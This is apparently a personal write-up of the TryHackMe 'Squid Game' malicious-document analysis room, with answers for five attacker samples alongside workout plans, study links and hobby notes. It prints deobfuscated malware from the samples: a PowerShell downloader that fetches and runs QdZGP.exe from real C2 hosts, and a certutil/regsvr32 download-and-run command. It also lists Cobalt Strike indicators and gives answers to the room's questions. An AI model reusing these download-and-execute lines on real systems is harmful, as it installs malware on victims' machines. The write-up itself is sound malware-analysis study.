# Squid-Game Help-Thorough

Name: Squid-Game
Date:  
Difficulty: Hard
Goals:  
- Novelty
- Sweet Points
- All the Malwares, but for the future
- YARA rules - useful
- If has docker use more docker
- Solution to just never email or open documents ever
- Automation if possible
- Finish: main, BR and unfinished supplementary  by end of Monday 
- Use more `assert` in my programming
- C Source code for Rust/Golang Malware
- Read Malware Analyst's Cookbook 
- Other Objectives
Learnt:
- This is not a malware analysis CTF
- https://github.com/PaperMtn
- Lena Rain is an awesome Composer - hackmud soundtrack hit very nicely at points
- oletoolage
- vmonkey can just solve all your problems
- some vba
- Forensics and a reminder of why Columbo is the best
Beyond Root:
- FEATURE CREEP MALWARE AND DETECTION
- BiS Cyberchef
- Forensics QB methodology
- Finish https://tryhackme.com/r/room/sandboxevasion and https://tryhackme.com/r/room/deadend
- Guided Hacking relevant playlist
	- https://www.youtube.com/watch?v=zzpz3VYKzUw - YARA rules reminder - Done
	- https://www.youtube.com/watch?v=wSkUbP9t4Dw - reversing a loader
	- https://www.youtube.com/watch?v=TgYb3hwOAV4 - Crypters how? - Done
	- https://www.youtube.com/watch?v=cNP6QXXUxro - Lockbit document 
	- https://www.youtube.com/watch?v=o0fvdfEmQAk - Lockbit killchain 
	- https://www.youtube.com/playlist?list=PLt9cUwGw6CYFrFbDkpdHi43ti5dmUfoOd - anti debuging techniques - 2
	- finalise a list for ten single play games that I would like to hack to make the game *playable*, not cheatable - to pick from in the future if I need stuff to do and relax and to keep me relaxing while these weeks and months roll on by.
- Squeeze the 100ish pages from Art of Exploitation into using C related things I struggle to remember or use because of beginner based projects
- Malicious Obsidian and Detecting Malicious Obsidian
- Classifying problem solving observation as a scale
 
- [[Squid-Game-Notes-Attacker-1]]
- [[Squid-Game-Notes-Attacker-2]]
- [[Squid-Game-Notes-Attacker-3]]
- [[Squid-Game-Notes-Attacker-4]]
- [[Squid-Game-Notes-Attacker-5]]
- [[Squid-Game-Meta-Notes]]

Warning I am an idiot and this Helped-thorough is only a write because I will try to upgrade any Malware and detections and mitigations. I briefly skimmed to have an idea of the direction to complete this: [kumarishefu Medium Writeup](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-squid-game-1102eb0b7230); this women is a amazing and anyone who has completed this without assistance is awesome. It is very sad that these great people will have to work in places where they just open all the bad pdfs and documents files. All got from it was that I need to use tools I have used in HTB Forensics challenge (`oletools`) and a healthy dosing of the great `cyberchef`. I have also not watch Squid Game so I ask Chatgpt to provide some information as if I was an alien, I will not use Chatgpt in completing this. Basically its Korean-Pre apocalyptic version of Roman Coliseum with instead of glory being the currency, Yen is the currency that the participants strive for, because their master have no creativity and have ruined themselves to hasten the end of Korean civilisation like all civilisations. Themes of death with change, guilt or mercilessness, survival and power and powerless. Remember it could always be worse than Squid Games, like the [Despair Squid](https://www.youtube.com/watch?v=ce-Uc3InSxk). Anyway this is a CTF I plan to tie as many relevant projects, unfinished CTFs and personal goals.

Firstly mute THM tab before you loose your mind!
![](savingyoursanity.png)

Also do you eyes a favour:
![](terminaleyes.png)

Also `Right-Click` the `xfce-terminal` Windows once run and set the scrollback to 10000.


TIL - People love Macros in [Excel and the darkness inside it](https://www.youtube.com/watch?v=xydcP31wVRk)
## My Scenario

Fixed this to reflect actually finding from QB methods

0. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
1. 1 Hour per Attacker Document, record what I did in [[Squid-Game-Notes-Attacker]]
2. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
3. 30 minutes following multiple Writeups -> Collect Forensics and Malware Dev Problem solving Patterns
4. 30 minutes ideas, rest, code scaffolding and copying (no Chatgpt); MUST have detection for each - so this should be a very fast and loose - focus on stupid questions not answers; minutes QB Method, Archive additions
5. Repeat if there is time - replace Room for Attacker-X or code X and hopeful [Ionian nerve grip my problems](https://www.youtube.com/watch?v=xOFrFt5gKFw) and [For the emperor!](https://www.youtube.com/watch?v=7IMuLiNWyHg)

2 hours

5 Days of Squid-Gaming
5 Days of tangent unfinished rooms that are CTFs 

Progress only the necessary, non-linear THM  
https://tryhackme.com/r/room/squidgameroom
https://tryhackme.com/r/room/maldoc - doc section done
https://tryhackme.com/r/room/advancedstaticanalysis
https://tryhackme.com/r/room/androidmalwareanalysis
https://tryhackme.com/r/room/androidhacking101

For my Starting point see [[Squid-Game-Meta-Notes]]; main issue I found is there seems to be one way to do everything and probably because I am just ridiculous no on explained why forensically x action is a good decision.
## Scenario

Accept the invitation? (Yes/No)
```
Yes
```

Tools on the box of note:
- `trid`
- `vmonkey`
- oletools each can be run like:
	- `oleid`
	- `olebrowse`   
	- `oledir` 
	- `oledump.py`
	- `olefile`     
	- `olemap`
	- `olemeta`     
	- `oleobj`
	- `oletimes`
	- `olevba`

## Attacker 1

[Medium @kumarishefu.4507 Attacker 1](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-squid-game-attacker1-9b4509882524); I got questions 6 - 9; checked [papermtn's blog](https://papermtn.co.uk/tryhackme-squid-game-attacker-1/), but it does not use different tools

What is the malicious C2 domain you found in the maldoc where an executable download was attempted?; Answer:
```
fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas
```
QB-Forensics-Notes:
```
```
What executable file is the maldoc trying to drop?; Answer:
```
QdZGP.exe
```
QB-Forensics-Notes:
```
```
In what folder is it dropping the malicious executable? (hint: %Folder%); Answer:
```
%ProgramData%
```
QB-Forensics-Notes:
```
Knowing Windows Knowing your favourite folders! AHAAAA  
USED THE POWER OF MY BRAIN!
```
Provide the name of the COM object the maldoc is trying to access.; Answer:
```bash
# dork com object -thm C08AFD90-F2A1-11D1-8455-00A0C91F3880
ShellBrowserWindow
```
QB-Forensics-Notes:
```
```
Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php); Answer:
```
176.32.35.16/704e.php
```
QB-Forensics-Notes:
```
```
Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx); Answer:
```bash
olemeta attacker1.doc
# 213-446-1757
```
QB-Forensics-Notes:
```
Metadata 
```
Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.; Answer:
```bash
olevba
# AutoExec
```
QB-Forensics-Notes:
```
```
Provide the subject for this maldoc. (make sure to remove the extra whitespace); Answer:
```bash
olemeta attacker1.doc
# 213-446-1757
# West Virginia  Samanta
```
Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX); Answer:
```bash
oletimes
# 2019-02-07 23:45:30
```
QB-Forensics-Notes:
```
Timestamp modification affect Forensic time lining
```
Provide the stream number that contains a macro.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the name of the stream that contains a macro.; Answer:
```
```
QB-Forensics-Notes:
```
```

Important Takeways
```bash
# Noting went well I found and noted Replace() function that helps in decoding the powershell script

# Best practice seems to be go string by string till you hit a good line
oledump.py -s $int $maldoc
oledump.py -s $specialLineNum -S $maldoc
```

![](followingonday1.png)

Nice bit of bad php that contains answers 1-5
```php
$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
$method = [System.Net.WebClient].GetMethods();
foreach($m in $method){

  if($m.Name -eq "DownloadString"){
    try{
     $uri = New-Object System.Uri("http://176.32.35.16/704e.php")
     IEX($m.Invoke($instance, ($uri)));
    }catch{}

  }

  if($m.Name -eq "DownloadData"){
     try{
     $uri = New-Object System.Uri("http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
     $response = $m.Invoke($instance, ($uri));

     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
     [System.IO.File]::WriteAllBytes($path, $response);

     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
     $type = [Type]::GetTypeFromCLSID($clsid)
     $object = [Activator]::CreateInstance($type)
     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)

     }catch{}
     
  }
}

Exit;
```


QB-X Notes
```
Columbo deals in components and I just looked at the VBA like the attacker would have wanted and fell down a particial rabbithole of fear!

Solution:
- Have a fast eye for what you want to look for first
- Input: toLookFor -> FastEyes(X amount of time) -> Output
```
## Attacker 2 

[[Squid-Game-Notes-Attacker-2]]; Given how quickly I managed to get all the answers other than confused as to why 15671 is not the answer to question 2, I decided that `olevba` is OP for this document so wanted to then spend more time learning about Cryptors and obfuscating in C/Rust and Golang instead of puzzling my way to nowhere. The answer being `oledump -i` is more informative 

Provide the streams (numbers) that contain macros.; Answer:
```
12, 13, 14, 16
```
QB-Forensics-Notes:
```

```
Provide the size (bytes) of the compiled code for the second stream that contains a macro.; Answer:
```
13867
```
QB-Forensics-Notes:
```
```
Provide the largest number of bytes found while analyzing the streams.; Answer:
```
olevba
63641
```
QB-Forensics-Notes:
```
```
Find the command located in the ‘fun’ field ( make sure to reverse the string).; Answer:
```
https://gchq.github.io/CyberChef/#recipe=Reverse('Character')&input=c2J2Lm5pcFxhdGFEbWFyZ29yUFw6QyBleGUudHBpcmNzYyBrLyBkbWM
olevba

cmd /k cscript.exe C:\ProgramData\pin.vbs
```
QB-Forensics-Notes:
```
```
Provide the first domain found in the maldoc.; Answer:
```
olevba
priyacareers.com/u9hDQN9Yy7g/pt.html
```
QB-Forensics-Notes:
```
Tools general parse data linearly
```
Provide the second domain found in the maldoc.; Answer:
```
olevba
perfectdemos.com/Gv1iNAuMKZ/pt.html
```
QB-Forensics-Notes:
```
```
Provide the name of the first malicious DLL it retrieves from the C2 server.; Answer:
```
olevba
www1.dll
```
QB-Forensics-Notes:
```
```
How many DLLs does the maldoc retrieve from the domains?; Answer:
```
olevba
5
```
QB-Forensics-Notes:
```
```
Provide the path of where the malicious DLLs are getting dropped onto?; Answer:
```
olevba
C:\ProgramData
```
QB-Forensics-Notes:
```
```
What program is it using to run DLLs?; Answer:
```
olevba
rundll32.exe
```
QB-Forensics-Notes:
```
```
How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?; Answer:
```
olevba - .Sleep(15000) -> 15 secs
15
```
QB-Forensics-Notes:
```
```
Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).; Answer:
```
olevba
Macros/Form/o
```
QB-Forensics-Notes:
```
```

`olevba` is the 

QB-X Notes
```
```
Important Takeways
```
Stomping
- VBA Stomping


Sometimes it does not matter how intimediating anything is if you can analyse it so affectively it is almost like


What is analysis from  programmatical sense?
What is should a tol do from an analytical sense post chatgpt3.0
```
## Attacker 3 

Disconcerted at the ease of the last document. Shoulders and wings ache in the same sort of way that bouldering makes you realise you are not a lego person; also aced this with distractions and issues.

Provide the executable name being downloaded.; Answer:
```
olevba
1.exe 
```
QB-Forensics-Notes:
```
```
What program is used to run the executable?; Answer:
```
# Guessed, but `set u=tutil` creates the %u% variable in batch
certutil
```
QB-Forensics-Notes:
```
```
Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).; Answer:
```vb
' olevba
Public Module Program
	Public Sub Main(args() As string)
	      Dim ju As String
	      Dim eR() As String
	      Dim lc As Double
	      Dim hh As String
	      Dim h As String
		    ju = "12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77"
        eR = Split(ju, "%")
        For lc = 0 To UBound(eR)
        hh = hh & Chr(eR(lc) Xor 111)
        Next lc
        h = hh
        Console.WriteLine(h)
	End Sub
End Module

cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ http://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"

' 8cfayv.com/bolb/jaent.php?l=liut6.cab
```
QB-Forensics-Notes:
```
```
What folder does the binary gets dropped in?; Answer:
```
# olevba
ProgramData
```
Which stream executes the binary that was downloaded?; Answer:
```
# oledump.py
A3
```
QB-Forensics-Notes:
```
```

QB-X Notes
```
Tiberious is right - behold XOR 

```
Important Takeways
```
```
## Attacker 4


[[Squid-Game-Notes-Attacker-4]] did an hour and got some environment variables, but none of the answers below; realised I went too deep into source and ran out of time I did not reverse this block sadly:
```vb
Set VPBCRFOQENN = CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))
GoTo fpvygztoabfyscyqmjxaakqwiwqpjfzgwplzmhryvptavvsitizcoqgammdhoraqpviudbameizhxxkfiw:
fpvygztoabfyscyqmjxaakqwiwqpjfzgwplzmhryvptavvsitizcoqgammdhoraqpviudbameizhxxkfiw:
GoTo fjuvxpaemzuawljcczrjcqncfqtadadckbfxynawdigwsmxxfdtoiyzyriibnsacdbvkbubskrjrvkujkg:
fjuvxpaemzuawljcczrjcqncfqtadadckbfxynawdigwsmxxfdtoiyzyriibnsacdbvkbubskrjrvkujkg:
GoTo atdgxcypqufobazqwfbzsdpphuexwbgmzrvveuqfuissqnqrjbvmoathximeitkzlsazxqlwrbwkegkczc:
atdgxcypqufobazqwfbzsdpphuexwbgmzrvveuqfuissqnqrjbvmoathximeitkzlsazxqlwrbwkegkczc:
    VPBCRFOQENN.Open XORI(Hextostring("00353B"), Hextostring("47706F634E")), FYAMZFQXNVI, False
GoTo 
```

But also I used the functions themselves, which I thought would work

Provide the first decoded string found in this maldoc.; Answer:
```bash
# 3F34193F254049193F253A331522;  7267417269 is the XOR Key
# https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'7267417269'%7D,'Standard',false)&input=M0YzNDE5M0YyNTQwNDkxOTNGMjUzQTMzMTUyMg

MSXML2.XMLHTTP
```
QB-Forensics-Notes:
```
```
Provide the name of the binary being dropped.; Answer:
```bash
# Same as question 1
DYIATHUQLCW.exe
```
QB-Forensics-Notes:
```
```
Provide the folder where the binary is being dropped to.; Answer:
```
# Guessed
Temp
```
QB-Forensics-Notes:
```

```
Provide the name of the second binary.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the full URI from which the second binary was downloaded (exclude http/https).; Answer:
```
```
QB-Forensics-Notes:
```
```

https://medium.com/@kumarishefu.4507/try-hack-me-write-up-squid-game-1102eb0b7230 cites: 
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/deobfuscating-malicious-macros-using-python/

QB-X Notes
```
Have got background tooling running, automating information gathering to come back to later prevent going head first into obfuscated stuff?

I seperated it out, but

Have you seperated out functions, methods with their corresponding classes?

Can you replace the functions with external tooling - ie. Cyberchef


Does it look like some encoding type:
	- Hex?

Classifying problem solving observation as a scale is a now a must for BR 

```
Important Takeways
```
Went to deep and went too methodical to understand, but a tiny step back
- I could have replace the functions with tooling 

Could have just used vmonkey for everything
```

https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/environ-function
https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/createobject-function

## Attacker 5

No time, no exercise; vmonkey ready in one tab, oleid in the other and Cyberchef Hex->XOR in browser tab 

Its a cobalt strike stager not a beacon

https://ak100117.medium.com/analyzing-cobalt-strike-powershell-payload-64d55ed3521b

https://www.embeeresearch.io/ghidra-basics-shellcode-analysis/ - Ghidra did not work - compile does not matter according 

https://research.nccgroup.com/2022/03/25/mining-data-from-cobalt-strike-beacons/
https://medium.com/@polygonben/deobfuscating-a-powershell-cobalt-strike-beacon-loader-c650df862c34

I found with 3 minute to go 
https://github.com/mattnotmax/cyberchef-recipes?tab=readme-ov-file#recipe-28---de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode; but leave me at the same point with binary data file I can analyse


https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/1768.py
didier analysis python script did not work and no internet on the box to git clone 



What is the caption you found in the maldoc?; Answer:
```
# Did not do the sequencial stream dumping oledump -s 6
```
QB-Forensics-Notes:
```
```
What is the XOR decimal value found in the decoded-base64 script?; Answer:
```
# I decoded using it but forget to put this answer in 
35
```
QB-Forensics-Notes:
```
```
Provide the C2 IP address of the Cobalt Strike server. ; Answer:
```
176.103.56.8
```
QB-Forensics-Notes:
```
```
Provide the full user-agent found.; Answer:
```
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)
```
QB-Forensics-Notes:
```
```
Provide the path value for the Cobalt Strike shellcode.; Answer:
```
# FORGET scdbg exists on the box! And I was going to put /SjMR as you can see it in the binary data clearly, but that would be too guessy
/SjMR
```
QB-Forensics-Notes:
```
```
Provide the port number of the Cobalt Strike C2 Server.; Answer:
```
# FORGET scdbg exists on the box!
8080
```
QB-Forensics-Notes:
```
```
Provide the first two APIs found.; Answer:
```
# FORGET scdbg exists on the box!
LoadLibraryA, InternetOpenA
```
QB-Forensics-Notes:
```
```

QB-X Notes
```
- Caption would be a not real world; I did not have time to sequencial stream with oledump
```
Important Takeways
```
- vipermonkey, scdbg pages for the Archive
```

## Post-Completion-Reflection  

## Beyond Root

Before venturing forth check the following in the Post-completion-Reflection:
- QB-Forensics-Notes, QB-X Notes, Important Takeways:
- [[Squid-Game-Meta-Notes]]

#### Theory Crafting the good and the bad in an ugly way

Previous to this point the best prevention is to never open any documents, pdf, etc

- There must be a algorithm that determines the scale of human readable code as intuitively my Grandma could spot bad VBA as ultra weird nonsense 



- IsItBadDoc 
	- No internet access
	- Automate external disconnection from internal network
	- Change permissions to prevent accidental human reading
	- No libreoffice, browsers, etc
	- Docker images for all the tools
	
#### Funny Ideas

- Infinite Captcha

#### Classifying problem solving observation as a scale
#### Cryptors

https://www.youtube.com/watch?v=TgYb3hwOAV4
- https://github.com/NYAN-x-CAT


https://github.com/intere/hacking/tree/master/booksrc
https://github.com/amenasec/Hacking-The-Art-of-Exploitation-2e
#### Single player Game to Hack / Mod


- Graveyard Keeper - Apparently this already has mods. Also already labour a lot as it is, do not need a work simulator; Music is good!
	- Speed increase
	- Energy reduced usage
	- Bigger inventory 
	- Infinite Storage
	- Animation speed
- Baldurs Gate 3 - not that it is bad, I want to see that game live on for the next 10-15 years it is that good
- Grey Hack - Because why not try one multiplayer game - Or just find a transpiler
	- Exfil scripts 
